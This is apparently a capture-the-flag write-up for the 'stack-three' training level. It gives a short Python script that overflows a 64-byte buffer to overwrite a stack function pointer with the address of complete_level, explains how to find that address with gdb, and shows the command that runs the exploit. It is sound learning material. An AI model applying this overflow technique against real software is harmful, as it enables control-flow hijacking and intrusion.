# stack-three
#### Script
```python
import sys 

value = 0x40069d.to_bytes(4,'little')
inject = b'A'* 64 + value 

sys.stdout.buffer.write(inject)
```
#### Analysis
According to the challenge description, we need to overwrite a function pointer on the stack. This function pointer corresponds to the *complete_level* function:
```c
char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int (*fp)();
  } locals;

}
```

In the *locals* struct, we have our usual buffer followed by a **volatile int** pointer called *fp*. This function pointer should be overwritten to the *complete_level* address to complete the level.
###### Getting the address
We need to know the memory address the *complete_level* function is located in. We can get this in a variety of ways. 
- Debugger (gdb)
- Objdump 
- Disassemblers (Ghidra, IDA, etc...)

For simplicity, we can just use gdb to get this information by launching gdb on the file and passing over 
	info address complete_level
This gives us the value **0x40069d**. With this, we can use our script to execute the exploit.
```shell
python3 scripts/stack_three.py | ./stack_three
```
